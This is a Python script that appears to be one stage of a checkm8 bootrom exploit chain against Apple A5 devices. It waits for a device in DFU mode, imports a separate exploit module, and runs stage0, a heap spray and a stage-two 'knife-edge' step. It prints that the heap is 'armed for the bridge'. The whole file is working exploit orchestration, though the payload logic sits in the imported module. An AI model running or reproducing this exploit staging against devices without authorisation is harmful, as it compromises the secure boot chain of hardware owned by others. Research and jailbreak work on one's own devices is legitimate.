#!/usr/bin/env python3
"""pwn-stageA.py — wait for fresh DFU, then stage0 + spray + knife-edge.

Exits 0 only when stage 2 lands the exact knife-edge state
(rcvd < padding, remainder delivered). No module interaction here.
"""
import argparse
import importlib.util
import os
import sys

TOOLS = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'tools')
spec = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(spec)
spec.loader.exec_module(P)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--wait', type=float, default=0.0)
    args = ap.parse_args()

    usb = P.LibUSB()
    P.LibUSB._current = usb
    print('[A] payload set:', P.load_payloads('classic')[0].__len__(),
          'bytes')

    sys_serial = ''
    if args.wait:
        print('[A] waiting for fresh DFU (sysfs poll only)')
        syspath, sys_serial = P.sysfs_dfu(timeout=args.wait)
        if syspath is None:
            print('[A] error: no DFU device appeared')
            return 1
        print('[A] DFU arrived:', syspath)
        if sys_serial:
            print('[A] sysfs serial:', sys_serial)
    else:
        _, sys_serial = P.sysfs_dfu(timeout=2.0)
        if not sys_serial:
            print('[A] error: no DFU device on the bus; pass --wait')
            return 1

    P.stage0(usb, 0)
    dev, handle, desc, serial = P.acquire(usb, want_serial=False)
    serial_idx = desc.iSerialNumber
    usb.release(handle)

    live = P.stage1(usb, serial_idx, 620, 'in-cancel', 80, 2.0, True)
    live2 = P.stage2(usb, 1000, 0x6c0, True, live_handle=live)
    if live2 is not None:
        live = live2
    usb.release(live) if live else None
    print('[A-OK] knife-edge landed; heap armed for the bridge')
    return 0


if __name__ == '__main__':
    sys.exit(main())
